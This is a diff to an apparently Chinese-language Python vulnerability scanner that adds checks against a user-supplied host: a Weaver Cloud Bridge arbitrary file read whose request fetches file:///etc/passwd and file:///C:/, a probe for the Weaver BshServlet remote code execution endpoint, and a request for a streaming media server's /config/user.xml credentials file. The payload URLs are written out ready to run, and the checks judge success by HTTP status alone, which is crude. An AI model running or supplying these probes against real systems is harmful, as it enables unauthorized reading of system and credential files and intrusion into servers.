@@ -60,11 +60,47 @@ def five():#weiphp任意文件读取漏洞
         print("\033[34m存在weiphpv5.0任意文件读取漏洞\033[0m")
     else:
         print("weiphpv5.0",url2.status_code)
+def six():#泛微云桥任意文件读取漏洞
+    url1="http://"+url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
+    url1_1="http://"+url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
+    try: url2=requests.get(url1)
+
+    except BaseException:
+        print("无法获取响应码")
+    try: url3 = requests.get(url1_1)
+    except BaseException:
+        print("无法获取响应码")
+
+    if url2.status_code==200 or url3.status_code==200:
+        print("\033[34m存在泛微云桥任意文件读取漏洞\033[0m")
+    else:
+        print("泛微云桥",url2.status_code)
+def seven():#泛微云桥远程代码执行漏洞
+    url1="http://"+url+"/weaver/bsh.servlet.BshServlet/"
+    try: url2=requests.get(url1)
+    except BaseException:
+        print("无法获取响应码")
+    if url2.status_code==200:
+        print("\033[34m存在泛微云桥远程代码执行漏洞\033[0m")
+    else:
+        print("泛微云桥",url2.status_code)
+def eight():#流媒体管理服务器
+    url1="http://"+url+"/config/user.xml"
+    try:url2=requests.get(url1)
+    except BaseException:
+        print("无法获取响应码")
+    if url2.status_code==200:
+        print("\033[34m存在流媒体管理服务器信息泄露\033[0m")
+    else:
+        print("流媒体管理服务器", url2.status_code)
+
 
 one()
 two()
 three()
 four()
 five()
-
+six()
+seven()
+eight()
 os.system("pause")
